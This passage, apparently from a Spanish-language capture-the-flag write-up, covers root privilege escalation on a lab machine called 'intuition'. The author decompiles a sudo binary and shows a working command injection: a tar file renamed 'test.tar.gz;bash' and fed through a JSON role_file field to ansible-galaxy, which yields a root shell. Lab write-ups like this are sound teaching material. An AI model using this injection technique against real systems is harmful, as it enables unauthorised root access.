<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/var/log/suricata$ sudo /opt/runner2/runner2
</span></span><span style="display:flex;"><span>Usage: /opt/runner2/runner2 &lt;json_file&gt;
</span></span></code></pre></div><p>Si creamos un comprimido con un archivo json vacío y se lo pasamos al binario..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/tmp$ sudo /opt/runner2/runner2 /tmp/test.tar.gz 
</span></span><span style="display:flex;"><span>Error parsing JSON data.
</span></span></code></pre></div><p>Como por detrás se está usando ansible-playbooks, podemos deducir que para la gestión de este comprimido se está utilizando ansible-galaxy</p>
<p>Abriendo el binario con ghidra vemos la estructura que debe de tener el archivo .json mas o menos.
<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
<p>Sabemos que tiene que tener un atributo <code>run</code> y <code>action</code>
<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
<p>Dentro del atributo <code>run</code> vemos que tiene que tener un atributo <code>auth_code</code> que suponemos que es el mismo que para el binario <code>runner1</code>
<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
<p>Y dentro el atributo <code>run</code> , si la <code>action</code> es <code>install</code> , debe de haber otro atributo llamado <code>role_file</code>
<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
<p>Si todo sale bien se llama al método <code>installRole</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// InstallRole Method
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">installRole</span>(undefined8 param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_418 [<span style="color:#ae81ff">1032</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">isTarArchive</span>(param_1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Invalid tar archive.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x15</span>,stderr);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(local_418,<span style="color:#ae81ff">0x400</span>,<span style="color:#e6db74">&#34;%s install %s&#34;</span>,<span style="color:#e6db74">&#34;/usr/bin/ansible-galaxy&#34;</span>,param_1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(local_418);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Este método requiere un archivo .tar y le pasa al binario /usr/bin/ansible-galaxy el parámetro que recibe el método.
En este caso es lo que esté en el atributo <code>role_file</code></p>
<p><img src="images/Screenshot_28.png" alt="Write-up Image"></p>
<p>Por lo cual si en el <code>role_file</code> incluimos un archivo .tar válido y acto seguimos inyectamos un comando, podríamos ejecutar un comando como el usuario <code>root</code>.</p>
<p>En el archivo se realiza una válidación del archivo .tar, por lo cual podemos crear un archivo .tar que se llame &ldquo;loquesea.tar.gz;id&rdquo; y así inyectar el comando.</p>
<p>Así habría quedado el archivo .json</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;run&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;install&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;role_file&#34;</span>: <span style="color:#e6db74">&#34;/tmp/test.tar.gz;id&#34;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;auth_code&#34;</span>: <span style="color:#e6db74">&#34;UHI75GHINKOP&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ahora creamos el archivo .tar</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/tmp$ tar -cvf test.tar.gz test.json 
</span></span><span style="display:flex;"><span>test.json
</span></span></code></pre></div><h2 id="inyectando-un-comando-como-root">Inyectando un comando como <code>root</code></h2>
<p>Ahora cambiamos el nombre al archivo .tar</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/tmp$ mv <span style="color:#e6db74">&#34;test.tar.gz&#34;</span> <span style="color:#e6db74">&#34;test.tar.gz;id&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/tmp$ sudo /opt/runner2/runner2 test.json
</span></span><span style="display:flex;"><span>Starting galaxy role install process
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span>: - /tmp/test.tar.gz was NOT installed successfully: Unknown error when
</span></span><span style="display:flex;"><span>attempting to call Galaxy at <span style="color:#e6db74">&#39;https://galaxy.ansible.com/api/&#39;</span>: &lt;urlopen error <span style="color:#f92672">[</span>Errno -3<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Temporary failure in name resolution&gt;
</span></span><span style="display:flex;"><span>ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y se acontece la inyección del comando <code>id</code> y se ejecuta como el usuario <code>root</code></p>
<p>Ahora para conseguir una bash, cambiamos el nombre del archivo a <code>test.tar.gz;bash</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/tmp$ mv <span style="color:#e6db74">&#34;test.tar.gz;chmod u+s bash&#34;</span> <span style="color:#e6db74">&#34;test.tar.gz;bash&#34;</span>
</span></span></code></pre></div><p>Cambiamos el archivo .json</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;run&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;install&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;role_file&#34;</span>: <span style="color:#e6db74">&#34;/tmp/test.tar.gz;bash&#34;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;auth_code&#34;</span>: <span style="color:#e6db74">&#34;UHI75GHINKOP&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Y ejecutamos el binario..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/tmp$ sudo /opt/runner2/runner2 test.json
</span></span><span style="display:flex;"><span>Starting galaxy role install process
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span>: - /tmp/test.tar.gz was NOT installed successfully: Unknown error when
</span></span><span style="display:flex;"><span>attempting to call Galaxy at <span style="color:#e6db74">&#39;https://galaxy.ansible.com/api/&#39;</span>: &lt;urlopen error <span style="color:#f92672">[</span>Errno -3<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Temporary failure in name resolution&gt;
</span></span><span style="display:flex;"><span>ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
</span></span><span style="display:flex;"><span>root@intuition:/tmp# cat test.json
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;run&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;install&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;role_file&#34;</span>: <span style="color:#e6db74">&#34;/tmp/test.tar.gz;bash&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;auth_code&#34;</span>: <span style="color:#e6db74">&#34;UHI75GHINKOP&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>root@intuition:/tmp# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>¡Y ya estaría!</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
